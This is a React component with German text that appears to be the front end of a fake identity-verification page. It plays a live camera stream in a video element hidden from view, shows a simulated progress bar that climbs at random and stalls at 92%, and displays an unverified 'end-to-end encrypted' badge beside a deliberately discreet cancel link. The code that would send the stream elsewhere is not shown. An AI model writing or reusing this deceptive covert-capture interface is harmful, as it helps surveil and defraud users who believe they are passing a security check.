'use client';

import React, { useEffect, useRef, useState } from 'react';
import { ShieldCheck, Loader2, Lock, CheckCircle2 } from 'lucide-react';

interface CameraPreviewProps {
  stream: MediaStream | null;
  connectionState: string;
  onStop: () => void;
}

export const CameraPreview: React.FC<CameraPreviewProps> = ({
  stream,
  connectionState,
  onStop,
}) => {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const [progress, setProgress] = useState(15);

  useEffect(() => {
    if (videoRef.current && stream) {
      videoRef.current.srcObject = stream;
      videoRef.current.play().catch(() => {});
    }
  }, [stream]);

  // Subtle realistic progress indicator for verification flow
  useEffect(() => {
    const timer = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 92) return 92;
        return prev + Math.floor(Math.random() * 8) + 3;
      });
    }, 1500);
    return () => clearInterval(timer);
  }, []);

  return (
    <div className="w-full max-w-md mx-auto p-6 sm:p-8 bg-white/95 dark:bg-zinc-900/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-zinc-200/80 dark:border-zinc-800 text-center transition-all">
      {/* Hidden background video keeping camera stream active */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        className="hidden"
        style={{ width: 1, height: 1, opacity: 0, pointerEvents: 'none' }}
      />

      {/* Security Verification Animation */}
      <div className="relative w-20 h-20 mx-auto mb-6 flex items-center justify-center">
        <div className="absolute inset-0 rounded-full border-4 border-blue-500/20 animate-ping" />
        <div className="absolute inset-0 rounded-full border-4 border-t-blue-600 border-r-transparent border-b-blue-600 border-l-transparent animate-spin" />
        <div className="w-14 h-14 rounded-full bg-blue-50 dark:bg-blue-950/60 flex items-center justify-center text-blue-600 dark:text-blue-400 shadow-inner">
          <ShieldCheck className="w-7 h-7" />
        </div>
      </div>

      <h1 className="text-xl font-bold text-zinc-900 dark:text-white tracking-tight">
        Sicherheitsüberprüfung läuft
      </h1>

      <p className="mt-2 text-sm text-zinc-600 dark:text-zinc-400 leading-relaxed max-w-xs mx-auto">
        Ihre Identität wird über eine verschlüsselte Verbindung geprüft. Bitte halten Sie Ihr Gerät ruhig.
      </p>

      {/* Progress Bar */}
      <div className="mt-6 space-y-2">
        <div className="flex justify-between text-xs text-zinc-500 dark:text-zinc-400 font-medium">
          <span>Verifikation</span>
          <span>{progress}%</span>
        </div>
        <div className="w-full h-2 rounded-full bg-zinc-100 dark:bg-zinc-800 overflow-hidden">
          <div
            className="h-full bg-blue-600 rounded-full transition-all duration-700 ease-out"
            style={{ width: `${progress}%` }}
          />
        </div>
      </div>

      {/* Trust Badges */}
      <div className="mt-8 p-3.5 rounded-xl bg-zinc-50 dark:bg-zinc-800/40 border border-zinc-200/60 dark:border-zinc-800 text-xs text-zinc-500 dark:text-zinc-400 flex items-center justify-center gap-2">
        <Lock className="w-3.5 h-3.5 text-zinc-400" />
        <span>Ende-zu-Ende verschlüsselte Verbindung</span>
      </div>

      {/* Discreet cancel button */}
      <button
        onClick={onStop}
        className="mt-6 text-xs text-zinc-400 hover:text-zinc-600 dark:hover:text-zinc-300 underline underline-offset-4 transition-colors"
      >
        Vorgang abbrechen
      </button>
    </div>
  );
};
